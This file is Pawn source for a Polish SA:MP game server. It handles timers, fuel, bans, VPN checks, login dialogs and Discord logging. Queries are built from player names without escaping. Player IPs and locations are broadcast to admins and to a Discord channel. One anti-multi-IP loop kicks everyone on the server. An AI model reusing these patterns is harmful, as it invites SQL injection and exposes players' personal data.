	STimer = SetTimer("SecondTimer", 250, 1);
	SetTimer("MinuteTimer", 1000, 1);
	SetTimer("ChangeTD", 1000*10, 1);
	SetTimer("SaveClans", 1000*600, 1);
	SetTimer("UpdateHouses", 1000*1800, 1);
	SetTimer("SavePrivcars", 1000*600, 1);
	SetTimer("RespawnAut", 1000*600, 0);
	SetTimer("LosowanieG", 1000*180, 1);
	SetTimer("MKDel", 1000*15, 1);
	SetTimer("UpdateArenaTOP", 1000*300, 1);
	RespawnPokemons();
	SetTimer("AntiCheat", 1000, 1);
	SetTimer("AutoStartZabawa", 1000*180, 0);
	SetTimer("Sponsoring", 1000*120, 1);
	if(Beta) SetTimer("BetaInfo", 1000*90, 1);
	SetTimer("UNapady", 1000*1200, 1);
	SetTimer("PingReset", 1000*35, 1);
	SetTimer("MVP", 1000*600, 1);
	SetTimer("CrashReset", 1000*28, 1);
	SetTimer("LosujReflex", 1000*240, 1);
	SetTimer("LosujNowyEvent", 1000*900, 1);

	Loop(kamienid, MAX_KAMIEN) KamienOnMap[kamienid] = false;
	RespKamienie();

	LoadHouses();

	LosujReflex();
	LosujNowyEvent();

	if(GetMaxPlayers() != MAX_PLAYERS)
    {
        print("Uwaga znaleziono b³¹d w konfiguracji mapy zamykanie serwera...");
        SendRconCommand("exit"); }
   	FindDiscordChannels();
	return 1;
}

forward FindDiscordChannels();
public FindDiscordChannels() {
   	samp_admin = DCC_FindChannelById("340799660895764491");
	samp_chat = DCC_FindChannelById("340799407488499712");
   	new msg[256];
 	format(msg, sizeof(msg), "Serwer SA:MP uruchomiony w %d ms. (IMPREZA v2 "GM_VER")", GetTickCount() - counts);
    DCC_SendChannelMessage(samp_chat, msg); }

CMD:tankuj(playerid, params[])
{
   	if(GetPVarInt(playerid,"Tankuj") > gettime()) return DialogError(playerid, "{FFFF00}Ostatnio tankowa³eœ ju¿ pojazd na stacji benzynowej.");
	new r = -1;
    for(new x; x != sizeof(StacjePaliw); x++) {
    	if(IsPlayerInRangeOfPoint(playerid, 2.0, StacjePaliw[x][0], StacjePaliw[x][1], StacjePaliw[x][2])) r++; }
	if(Player[playerid][Exp] < 200) return DialogError(playerid, "{FFFF00}Tankowanie na stacji kosztuje 200 EXP.");
	if(r == -1) return DialogError(playerid, "{FFFF00}Nie jesteœ w pobli¿u stacji bezynowej.");
	Loop(privcarid, privcars)
	{
 		if(!IsPlayerInVehicle(playerid, ppVeh[privcarid]) && pOwner[privcarid] == Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w prywatnym pojeŸdzie.");
	    if(pOwner[privcarid] == Player[playerid][ID])
	    {
   		    pFuel[privcarid] = 50.0;
			Player[playerid][Exp] -= 200;
			new tdstr[256];
			if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
			if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
			if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
			if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
			Update3DTextLabelText(pText[privcarid], -1, tdstr);
		 	SetPVarInt(playerid,"Tankuj",gettime()+300);
		}
	}
	return 1;
}

forward MKDel();
public MKDel()
{
	m_query("SELECT id FROM connects");
	mysql_store_result();
	if(mysql_num_rows() > 0) {
		mysql_free_result();
		return m_query("TRUNCATE connects"); }
	mysql_free_result();
	return 1;
}

public OnGameModeExit()
{
	SaveClans();
	DestroyDynamicObject(BDbudynek);
	KillTimer(STimer);
	Loop(playerid, MAX_PLAYERS) { if(IsPlayerConnected(playerid)) SaveAllData(playerid); }
	Loop(gameid, MAX_GAMES) {
		Osoby[gameid] = 0;
		Wystartowala[gameid] = false;
		Startuje[gameid] = false; }
	Loop(kamien, MAX_KAMIEN)
	{
		if(KamienOnMap[kamien]) {
			Delete3DTextLabel(kText[kamien]);
			DestroyDynamicObject(kObj[kamien]);
			kKopany[kamien] = false; }
	}
	Loop(privcarid, MAX_PRIVCARS)
	{
	    if(OnMap[privcarid]) {
	        DestroyVehicle(ppVeh[privcarid]);
	        Delete3DTextLabel(pText[privcarid]);
	        if(pNeon[privcarid] > -1)
	        {
     			if(pNeon[privcarid] == 0)
				{
				    DestroyObject(pObject[privcarid][0]);
				    DestroyObject(pObject[privcarid][1]);
				}
				if(pNeon[privcarid] == 1)
				{
				    DestroyObject(pObject[privcarid][2]);
				    DestroyObject(pObject[privcarid][3]);
				}
				if(pNeon[privcarid] == 2)
				{
				    DestroyObject(pObject[privcarid][4]);
				    DestroyObject(pObject[privcarid][5]);
				}
				if(pNeon[privcarid] == 3)
				{
				    DestroyObject(pObject[privcarid][6]);
				    DestroyObject(pObject[privcarid][7]);
				}
				if(pNeon[privcarid] == 4)
				{
				    DestroyObject(pObject[privcarid][8]);
				    DestroyObject(pObject[privcarid][9]);
				}
				if(pNeon[privcarid] == 5)
				{
				    DestroyObject(pObject[privcarid][10]);
				    DestroyObject(pObject[privcarid][11]);
				}
			}
	        OnMap[privcarid] = false; }
	}
	if(gangs > 0) {
	    Loop(ganggid, gangs) { Delete3DTextLabel(gText[ganggid]); } }
    return DCC_SendChannelMessage(samp_chat, "Do zobaczenia. :smiley:");
}

public MyHttpResponse(playerid, response_code, data[])
{
	new msgs[256], msgsen[256];
	if(response_code == 200)
	{
	    new plrIP[16];
		GetPlayerIp(playerid, plrIP, sizeof(plrIP));
		if(data[0] == 'Y' && !CompareEx(plrIP, "127.0.0.1") && !CompareEx(isp[playerid], "ART-COM Sp. z o.o."))
		{
		    format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"VPN"C_RED")", Player[playerid][Name], playerid);
		    format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"VPN"C_RED")", Player[playerid][Name], playerid);
			SendClientMessageToAllEx(RED, msgs, msgsen);
			ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, "{FF3838}Sprawdzanie po³¹czenia", "{FF3838}Twoje po³¹czenie z serwerem nie jest poprawne.\nSpróbuj po³¹czyæ siê ponownie.", "Zamknij", "");
			DelayedKick(playerid);
			return kicks++;
		}
	}
	return 1;
}

hook_Delete3DTextLabel(&Text3D:theLabel)
{
	if(Text3D:theLabel != Text3D:0)
	{
		Delete3DTextLabel(Text3D:theLabel);
		theLabel = Text3D:0;
	}
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(CarTimer[playerid] >= 5) {
		new msgs[256], msgsen[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Car Spam"C_RED")", Player[playerid][Name], playerid);
		format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Car Spam"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	CarTimer[playerid]++;
    NOP[playerid] = false;
    if(newstate == PLAYER_STATE_DRIVER)
    {
        if (PlayerEnterTime[playerid] - GetTickCount() < 1000)
        {
            if (++PlayerSpamCount[playerid] >= 3)
            {
	   			new msgs[256], msgsen[256];
				format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Crasher C"C_RED")", Player[playerid][Name], playerid);
				format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Crasher C"C_RED")", Player[playerid][Name], playerid);
				if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
				KickMsg[playerid] = true;
				DelayedKick(playerid);
				return kicks++;
            }
        }
        PlayerEnterTime[playerid] = GetTickCount();
    }
    return 1;
}

public OnPlayerConnect(playerid)
{
	SpecToggle(playerid, 1);
	ENMode[playerid] = false;
	Player[playerid][Gong] = 0;
	GProgress[playerid] = 100;
	GBarOn[playerid] = false;
	SpawnTimer[playerid] = 0;
	GGWarn[playerid] = 0;
	pEnemy[playerid] = -1;
	pFight[playerid] = false;
	ArenaWarn[playerid] = 0;
   	IsTaksowkarz[playerid] = 0;
   	NaCzyszczeniu[playerid] = false;
   	NaZbieraniu[playerid] = false;
   	NaKoszeniu[playerid] = false;
   	NaZrzucie[playerid] = false;
   	NaNurku[playerid] = false;
	NaSpedycji[playerid] = false;
	Spawning[playerid] = false;
  AFKPoints[playerid] = 100;
  TakedDamage[playerid] = 0;
  LastKilled[playerid] = -1;
  LoggedOnVip[playerid] = false;
	Registered[playerid] = false;
  Player[playerid][CPick] = 0;
	AFKTimer[playerid] = 0;
	AFK[playerid] = false;
    PlayerSpamCount[playerid] = 0;
	NOP[playerid] = true;
    PlayerEnterTime[playerid] = -1;
    BustedMode[playerid] = false;
	KickMsg[playerid] = false;
    LastState[playerid] = 0;
	OnTutorial[playerid] = false;
	LastWorld[playerid] = 0;
	Crasher[playerid] = -1;
	Crashed[playerid] = 0;
	SetPVarInt(playerid, "SellHousePlayerID", -1);
	SetPVarInt(playerid, "SellHouseSprzedajacy", -1);
	pData[playerid][InHouse] = INVALID_HOUSE_ID;
	SetPVarInt(playerid, "LastVisitedHouse", INVALID_HOUSE_ID);
	Streamer_ToggleIdleUpdate(playerid, 1);
	Streamer_ToggleItemUpdate(playerid, 0, 1);
	SetPVarInt(playerid, "player_objected", 0);
	Loop(napady, MAX_NAPADY) SetPlayerMapIcon(playerid, napady + 60, NX[napady], NY[napady], NZ[napady], 52, MAPICON_LOCAL);
	Loop(klastry, 8) Klastry[playerid][klastry] = false;
  	SetPlayerPos(playerid, 2296.012451, 415.790100, 12.043163);
   	SetPlayerVirtualWorld(playerid, 69);
	hook_Delete3DTextLabel(pLabel[playerid]);
 	pLabel[playerid] = Create3DTextLabel(Player[playerid][Name], 0xFFFFFFFF, 0.0, 0.0, 0.25, 12.0, -1, 1);
    //*********************************************************************************//
	SetPVarInt(playerid, "ConnectStream", 1);
	//*********************************************************************************//
	Player[playerid][House] = -1;
	Player[playerid][ID] = -1;
	SpectatingPlayer[playerid] = -1;
	accountfound[playerid] = false;
	Shooter[playerid] = 0;
	IsDead[playerid] = false;
	gracze++;
	HavePrivcar[playerid] = false;
	Player[playerid][HasRealTime] = false;
	Player[playerid][HasSounds] = true;
	LowienieTrwa[playerid] = false;
	pOffer[playerid] = -1;
	pOfferExp[playerid] = -1;
	SavedX[playerid] = -1;
	SavedY[playerid] = -1;
	SavedZ[playerid] = -1;
	NapadID[playerid] = -1;
	CatchingPokemon[playerid] = -1;
	Player[playerid][Questy] = 0;
	SpeedWarnings[playerid] = 0;
	IsTaksowkarz[playerid] = 0;
	Opcja[playerid] = 0;
	Streak[playerid] = 0;
	PingLimit[playerid] = 0;
	Loop(skinid, MAX_SKINS) sk[playerid][skinid] = false;
	SetPVarInt(playerid,"IPark",gettime());
 	Attach3DTextLabelToPlayer(pLabel[playerid], playerid, 0.0, 0.0, 0.55);
	if(gracze > daily)
	{
	    daily = gracze;
	    new str[256];
	    format(str, sizeof(str), "Dzisiejszy rekord graczy! ("C_BLUE1"%d"C_WHITE")", daily);
	    SendClientMessageToAll(-1, str);
	    if(daily > record)
		{
	 		record = daily;
	    	new str2[256];
	    	format(str2, sizeof(str2), "Rekord graczy! ("C_BLUE1"%d"C_WHITE")", record);
	    	SendClientMessageToAll(-1, str2);
	    }
	}
	connects++;
	BattleTimer[playerid] = 0;
	TPTimer[playerid] = 0;
	LastPM[playerid] = -1; 
	ConstColor[playerid] = false; 
	TDOn[playerid] = true; 
 	ShowLicznik[playerid]= false; 
    SetRandomColor(playerid); 

	static const empty_player[E_PLAYERS];
	Player[playerid] = empty_player;

	GetPlayerName(playerid, Player[playerid][Name], MAX_PLAYER_NAME);

	Loop(loopid, MAX_PLAYERS) {
	    if(Player[loopid][Admin] > 0 && Player[loopid][IsLoggedIn] && !BustedMode[loopid]) {
	        new adminstr[256];
	        GetPlayerIp(playerid, ppip[playerid], 16);
	        GetPlayerCountry(playerid, kraj[playerid]);
	        GetPlayerCity(playerid, miasto[playerid]);
	        GetPlayerISP(playerid, isp[playerid]);
			format(adminstr, sizeof(adminstr), "{ffd83f}[connect] %s(%d) (IP: "C_WHITE"%s, %s-%s, %s{ffd83f})", Player[playerid][Name], playerid, ppip[playerid], kraj[playerid], miasto[playerid], isp[playerid]);
			SendClientMessage(loopid, RED, adminstr); } }

	new plrIP[16];
	GetPlayerIp(playerid, plrIP, sizeof(plrIP));
	m_query("SELECT id FROM connects WHERE ip = '%s'", plrIP);
	new msg[256];
	format(msg, sizeof(msg), "[%02d:%02d:%02d] [connect] %s (%d) (IP: %s).", hour, minute, second, Player[playerid][Name], playerid, plrIP);
   	DCC_SendChannelMessage(samp_admin, msg);
	mysql_store_result();
	if(mysql_num_rows() > 0) {
	    Loop(loopid, MAX_PLAYERS)
	    {
	        new IP[MAX_PLAYERS][16];
	        GetPlayerIp(loopid, IP[loopid], 16);
	        if(CompareEx(IP[loopid], plrIP)) DelayedKick(loopid);
	    }
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, "{FF3838}Sprawdzanie po³¹czenia", "{FF3838}Twoje po³¹czenie z serwerem nie jest poprawne.\nSpróbuj po³¹czyæ siê ponownie.", "Zamknij", "");
		DelayedKick(playerid);
		mysql_free_result();
		return kicks++; }
	mysql_free_result();
	m_query("SELECT ip FROM connects");
	mysql_store_result();
	new rows = mysql_num_rows();
	mysql_free_result();
	m_query("INSERT INTO connects (id, ip) VALUES (%d, '%s')", rows, plrIP);

	if(CompareEx(kraj[playerid], BlockISP)) {
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, "{FF3838}Sprawdzanie po³¹czenia", "{FF3838}Twoje po³¹czenie z serwerem nie jest poprawne.\nSpróbuj po³¹czyæ siê ponownie.", "Zamknij", "");
		DelayedKick(playerid);
		return kicks++; }

	Loop(loopedid, MAX_PLAYERS)
	{
        new PIP[MAX_PLAYERS][16], ips = 0;
 		GetPlayerIp(loopedid, PIP[loopedid], 16);
 		if(CompareEx(PIP[loopedid], plrIP)) ips++;
 		if(ips > 3)
 		{
			Loop(kickid, MAX_PLAYERS) {
				ShowPlayerDialog(kickid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, "{FF3838}Sprawdzanie po³¹czenia", "{FF3838}Twoje po³¹czenie z serwerem nie jest poprawne.\nSpróbuj po³¹czyæ siê ponownie.", "Zamknij", "");
				DelayedKick(kickid); }
 		}
	}

	new formato[59];
	format(formato, sizeof formato, "www.shroomery.org/ythan/proxycheck.php?ip=%s", plrIP);
	HTTP(playerid, HTTP_GET, formato, "", "MyHttpResponse");

	format(Player[playerid][Auth], 16, "0");

	new sqlquery[1024];
	m_query("SELECT * FROM players WHERE username = '%s'", Player[playerid][Name]);
	mysql_store_result();
	mysql_fetch_row(sqlquery, " ");
	if(mysql_num_rows() > 0) {
		accountfound[playerid] = true;
		sscanf(sqlquery, "i", Player[playerid][ID]); }
	mysql_free_result();

	if(accountfound[playerid])
	{
		new sqlquery2[3700], sqlquery3[1200], sqlstr[3700];
		format(sqlstr, sizeof(sqlstr), "SELECT id, password, kills, deaths, waluta, x, y, z, angle, interior, rank, mutetime, warny, skin, exp, level, vcash, hours, minutes, gang, house, s1, s2, s3, s4, s5, s6, s7, s8, s9, s10, s11, s12, s13, s14, s15, s16, s17, s18, s19, s20, s21, s22, s23, s24, s25, s26, s27, s28, s29, s30, s31, s32, s33, s34, s35, s36, s37, r1, r2, r3, r4, r5, r6, r7,");
		format(sqlstr, sizeof(sqlstr), "%s realtime, sounds, nicktime, vip, hitman, a1, a2, a3, a4, a5, a6, a7, a8, czat, solo, potwory, zabawy, visits, cbug, questy, jail, bonus, bank, cpick, bankc, rud, discord, gong FROM players WHERE id = %d LIMIT 1", sqlstr, Player[playerid][ID]);
		m_query(sqlstr);
		mysql_store_result();
		mysql_fetch_row(sqlquery2, " ");
		mysql_free_result();
		sscanf(sqlquery2, "is[65]iiiffffiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiifiiiiiiis[128]i", Player[playerid][ID], Player[playerid][Password], Player[playerid][Kills], Player[playerid][Deaths], Player[playerid][Cash], Player[playerid][X_Pos], Player[playerid][Y_Pos], Player[playerid][Z_Pos],
        	Player[playerid][A_Pos], Player[playerid][Interior], Player[playerid][Admin], Player[playerid][MuteTime], Player[playerid][Warny], Player[playerid][Skin], Player[playerid][Exp], Player[playerid][Level], Player[playerid][vCash], Player[playerid][Hours], Player[playerid][Minutes], Player[playerid][Gang], Player[playerid][House], sk[playerid][0], sk[playerid][1], sk[playerid][2],
				sk[playerid][3], sk[playerid][4], sk[playerid][5], sk[playerid][6], sk[playerid][7], sk[playerid][8], sk[playerid][9], sk[playerid][10], sk[playerid][11], sk[playerid][12], sk[playerid][13], sk[playerid][14], sk[playerid][15], sk[playerid][16], sk[playerid][17], sk[playerid][18], sk[playerid][19], sk[playerid][20], sk[playerid][21], sk[playerid][22], sk[playerid][23], sk[playerid][24],
					sk[playerid][25], sk[playerid][26], sk[playerid][27], sk[playerid][28], sk[playerid][29], sk[playerid][30], sk[playerid][31], sk[playerid][32], sk[playerid][33], sk[playerid][34], sk[playerid][35], sk[playerid][36], Player[playerid][r1], Player[playerid][r2], Player[playerid][r3], Player[playerid][r4], Player[playerid][r5], Player[playerid][r6], Player[playerid][r7], Player[playerid][HasRealTime], Player[playerid][HasSounds], Player[playerid][NickChange], Player[playerid][Vip],
						Player[playerid][Hitman], Player[playerid][GL], Player[playerid][Questy], JailTimeP[playerid], Player[playerid][Bonus], Player[playerid][Bank], Player[playerid][CPick], Player[playerid][BankC], Player[playerid][Rud], DiscordUser[playerid], Player[playerid][Gong]);

		m_query("SELECT item1, item1n, item2, item2n, item3, item3n, item4, item4n, item5, item5n, item6, item6n, item7, item7n, item8, item8n FROM players WHERE id = %d LIMIT 1", Player[playerid][ID]);
		mysql_store_result();
		while(mysql_fetch_row(sqlquery3))
		{
		    sscanf(sqlquery3, "p<|>s[1200]", sqlquery3);
 			sscanf(sqlquery3, "p<|>is[256]is[256]is[256]is[256]is[256]is[256]is[256]is[256]", Player[playerid][ItemAmount1], Player[playerid][ItemName1], Player[playerid][ItemAmount2], Player[playerid][ItemName2], Player[playerid][ItemAmount3], Player[playerid][ItemName3], Player[playerid][ItemAmount4],
  				Player[playerid][ItemName4], Player[playerid][ItemAmount5], Player[playerid][ItemName5], Player[playerid][ItemAmount6], Player[playerid][ItemName6], Player[playerid][ItemAmount7], Player[playerid][ItemName7], Player[playerid][ItemAmount8], Player[playerid][ItemName8]);
		}
 		mysql_free_result();
		Loop(ach, 22) {
 		    new sqlquery4[1024];
		 	m_query("SELECT ac%d FROM players WHERE id = %d", ach, Player[playerid][ID]);
		 	mysql_store_result();
		 	mysql_fetch_row(sqlquery4, " ");
			sscanf(sqlquery4, "i", pAch[playerid][ach]);
			mysql_free_result(); }
   		new sqlquery5[1024];
		m_query("SELECT auth FROM players WHERE id = %d", Player[playerid][ID]);
		mysql_store_result();
		mysql_fetch_row(sqlquery5, " ");
		sscanf(sqlquery5, "s[17]", Player[playerid][Auth]);
		mysql_free_result();
	    m_query("UPDATE players SET playerid = %d WHERE id = %d", playerid, Player[playerid][ID]);
  		m_query("SELECT uid, adminname, reason, isperm, expire FROM bans WHERE uid = %d", Player[playerid][ID]);
		mysql_store_result();
		new bansql[1024];
		if(mysql_num_rows() > 0)
		{
		    new playeruid, adminname[20], reason[64], isperm, expire;
		    mysql_fetch_row(bansql, " ");
			mysql_free_result();
		    sscanf(bansql, "is[20]s[64]ii", playeruid, adminname, reason, isperm, expire);
   	      	if(isperm == 1)
		 	{
		        new dialogban[1024];
		 		format(dialogban, sizeof(dialogban), "{FF0000}Jesteœ zbanowany!\n\nAdmin: "C_WHITE"%s\n{FF0000}Powód: "C_WHITE"%s\n\n{FF0000}Typ bana: "C_WHITE"Permanentny\n\n{FF0000}Mo¿esz odwo³aæ siê od bana na "C_WHITE""FORUM"{FF0000}.", adminname, reason);
				ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, "{FF0000}Ban", dialogban, "Zamknij", "");
   				DelayedKick(playerid);
				return kicks++;
			}
			else
			{
		    	if(gettime() < expire)
		    	{
		        	new dialogban[1024];
		 			format(dialogban, sizeof(dialogban), "{FF0000}Jesteœ zbanowany!\n\nAdmin: "C_WHITE"%s\n{FF0000}Powód: "C_WHITE"%s\n\n{FF0000}Typ bana: "C_WHITE"Czasowy\n\n{FF0000}Mo¿esz odwo³aæ siê od bana na "C_WHITE""FORUM"{FF0000}.", adminname, reason);
					ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, "{FF0000}Ban", dialogban, "Zamknij", "");
   					DelayedKick(playerid);
					return kicks++;
				}
				else m_query("DELETE FROM bans WHERE uid = %d", Player[playerid][ID]);
			}
		}
		mysql_free_result();
	}

	m_query("SELECT ip FROM bans WHERE ip = '%s'", plrIP);
	mysql_store_result();
	if(mysql_num_rows() > 0) {
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, "{FF3838}Sprawdzanie po³¹czenia", "{FF3838}Twoje po³¹czenie z serwerem nie jest poprawne.\nSpróbuj po³¹czyæ siê ponownie.", "Zamknij", "");
	    new ipban[256];
	    format(ipban, sizeof(ipban), "IP "C_WHITE"%s "C_RED"z którego chcesz siê po³¹czyæ jest zbanowane.", plrIP);
		SendClientMessage(playerid, RED, ipban);
	    DelayedKick(playerid);
	   	mysql_free_result();
	    return kicks++; }

	PlayAudioStreamForPlayer(playerid, "http://i.ct8.pl/c.mp3");
 	new msgs[256];
   	format(msgs, sizeof(msgs), ""C_LOLIVE"+ "C_GREEN"%s ("C_WHITE"%d"C_GREEN")", Player[playerid][Name], playerid); 
	SendClientMessageToAll(-1, msgs);

	if(gangs > 0)
	{
	    Loop(ganggid, gangs)
	    {
			if(gColor[ganggid] == 0) GangZoneShowForPlayer(playerid, gZone[ganggid], GREY);
			if(gColor[ganggid] == 1) GangZoneShowForPlayer(playerid, gZone[ganggid], GREEN);
			if(gColor[ganggid] == 2) GangZoneShowForPlayer(playerid, gZone[ganggid], RED);
			if(gColor[ganggid] == 3) GangZoneShowForPlayer(playerid, gZone[ganggid], YELLOW);
			if(gColor[ganggid] == 4) GangZoneShowForPlayer(playerid, gZone[ganggid], BLUE);
			if(gColor[ganggid] == 5) GangZoneShowForPlayer(playerid, gZone[ganggid], ORANGE);
			if(gColor[ganggid] == 6) GangZoneShowForPlayer(playerid, gZone[ganggid], MAGENTA);
			if(gColor[ganggid] == 7) GangZoneShowForPlayer(playerid, gZone[ganggid], AQUA);
			if(gColor[ganggid] == 8) GangZoneShowForPlayer(playerid, gZone[ganggid], GOLD);
			if(gColor[ganggid] == 9) GangZoneShowForPlayer(playerid, gZone[ganggid], SEAGREEN);
			if(gColor[ganggid] == 10) GangZoneShowForPlayer(playerid, gZone[ganggid], OLIVE);
			if(gColor[ganggid] == 11) GangZoneShowForPlayer(playerid, gZone[ganggid], SPRINGGREEN);
			if(gColor[ganggid] == 12) GangZoneShowForPlayer(playerid, gZone[ganggid], MAROON);
			if(gColor[ganggid] == 13) GangZoneShowForPlayer(playerid, gZone[ganggid], LIME);
			if(gColor[ganggid] == 14) GangZoneShowForPlayer(playerid, gZone[ganggid], MEDIUMAQUA);
			if(gColor[ganggid] == 15) GangZoneShowForPlayer(playerid, gZone[ganggid], MEDIUMMAGENTA);
		}
	}
	Loop(zony, MAX_GANGZONES) {
		if(gzOwner[zony] == -1) GangZoneShowForPlayer(playerid, gZZone[zony], WHITE);
		else {
		    new owner = gzOwner[zony];
			if(gColor[owner] == 0) GangZoneShowForPlayer(playerid, gZone[owner], GREY);
			if(gColor[owner] == 1) GangZoneShowForPlayer(playerid, gZone[owner], GREEN);
			if(gColor[owner] == 2) GangZoneShowForPlayer(playerid, gZone[owner], RED);
			if(gColor[owner] == 3) GangZoneShowForPlayer(playerid, gZone[owner], YELLOW);
			if(gColor[owner] == 4) GangZoneShowForPlayer(playerid, gZone[owner], BLUE);
			if(gColor[owner] == 5) GangZoneShowForPlayer(playerid, gZone[owner], ORANGE);
			if(gColor[owner] == 6) GangZoneShowForPlayer(playerid, gZone[owner], MAGENTA);
			if(gColor[owner] == 7) GangZoneShowForPlayer(playerid, gZone[owner], AQUA);
			if(gColor[owner] == 8) GangZoneShowForPlayer(playerid, gZone[owner], GOLD);
			if(gColor[owner] == 9) GangZoneShowForPlayer(playerid, gZone[owner], SEAGREEN);
			if(gColor[owner] == 10) GangZoneShowForPlayer(playerid, gZone[owner], OLIVE);
			if(gColor[owner] == 11) GangZoneShowForPlayer(playerid, gZone[owner], SPRINGGREEN);
			if(gColor[owner] == 12) GangZoneShowForPlayer(playerid, gZone[owner], MAROON);
			if(gColor[owner] == 13) GangZoneShowForPlayer(playerid, gZone[owner], LIME);
			if(gColor[owner] == 14) GangZoneShowForPlayer(playerid, gZone[owner], MEDIUMAQUA);
			if(gColor[owner] == 15) GangZoneShowForPlayer(playerid, gZone[owner], MEDIUMMAGENTA); } }
	SetPlayerMapIcon(playerid, 1001, 896.2174,2021.2773,10.8203, 25, MAPICON_GLOBAL);
	if(accountfound[playerid]) SetTimerEx("DelayLogin", 7000, 0, "i", playerid);
	else SetTimerEx("DelayRegister", 7000, 0, "i", playerid);
	SetTimerEx("ConnectCam", 200, 0, "i", playerid);
	if(strlen(DiscordUser[playerid]) > 2) {
		DiscordConnected[playerid] = true;
		DiscordChat[playerid] = true; }
	else {
		DiscordConnected[playerid] = false;
	    format(DiscordUser[playerid], 128, "0"); }
	return 1;
}

forward ConnectCam(playerid);
public ConnectCam(playerid) {
   	if(!ENMode[playerid]) SendClientMessageEx(playerid, -1, "To switch to English use "C_RED"/lang "C_WHITE"command.", "W celu zmiany jêzyka na Polski u¿yj "C_RED"/lang"C_WHITE".");
    Streamer_UpdateEx(playerid,2296.012451, 415.790100, 12.043163);
   	InterpolateCameraPos(playerid, 1623.023437, 544.316040, -7.452306, 1627.969970, 593.514465, 7.840536, 4000);
	InterpolateCameraLookAt(playerid, 1623.817138, 547.761352, -3.916772, 1628.062866, 598.508056, 8.076033, 4000); }

forward DelayLogin(playerid);
public DelayLogin(playerid) {
    SetPlayerVirtualWorld(playerid, 0);
    PlayerPlaySound(playerid,1062,0.0,0.0,0.0);
	new string[1024];
   	format(string, sizeof string, ""C_ORANGE"Witamy ponownie, "C_WHITE"%s"C_ORANGE"! Zaloguj siê wpisuj¹c has³o u¿yte podczas rejestracji.", Player[playerid][Name]);
	ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, ""C_ORANGE"Logowanie", string, "Zaloguj", "Kick"); }

forward DelayRegister(playerid);
public DelayRegister(playerid) {
    SetPlayerVirtualWorld(playerid, 0);
    PlayerPlaySound(playerid,1062,0.0,0.0,0.0);
	new string[1024];
	format(string, sizeof string, ""C_ORANGE"Witaj, "C_WHITE"%s "C_ORANGE"na "NAZWA""C_ORANGE"! Zarejestruj swoje konto wpisuj¹c has³o poni¿ej.", Player[playerid][Name]);
	ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, ""C_ORANGE"Rejestracja", string, "Zarejestruj", "Kick"); }

forward ShowBankMenu(playerid);
public ShowBankMenu(playerid) {
	new bankstr[2048];
	format(bankstr, sizeof(bankstr), ""C_WHITE"Wp³aæ EXP\n");
	format(bankstr, sizeof(bankstr), "%s"C_WHITE"Wyp³aæ EXP\n", bankstr);
	format(bankstr, sizeof(bankstr), "%s"C_LOLIVE"SprawdŸ stan konta "C_WHITE"(EXP)\n", bankstr);
	format(bankstr, sizeof(bankstr), "%s"C_WHITE"Wp³aæ gotówkê\n", bankstr);
	format(bankstr, sizeof(bankstr), "%s"C_WHITE"Wyp³aæ gotówkê\n", bankstr);
	format(bankstr, sizeof(bankstr), "%s"C_LOLIVE"SprawdŸ stan konta "C_WHITE"($)", bankstr);
	return ShowPlayerDialog(playerid, DIALOG_BANK, DIALOG_STYLE_LIST, ""NAZWA" "C_WHITE"» "C_GREEN"Bank", bankstr, "Wybierz", "Zamknij"); }

forward CheckHours(playerid);
public CheckHours(playerid)
{
	if(Player[playerid][Minutes] >= 60) {
 		Player[playerid][Hours] += 1;
   		Player[playerid][Minutes] -= 60;
		if(Player[playerid][Minutes] >= 60) CheckHours(playerid);
	}
}

public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ)
{
	return 1;
}

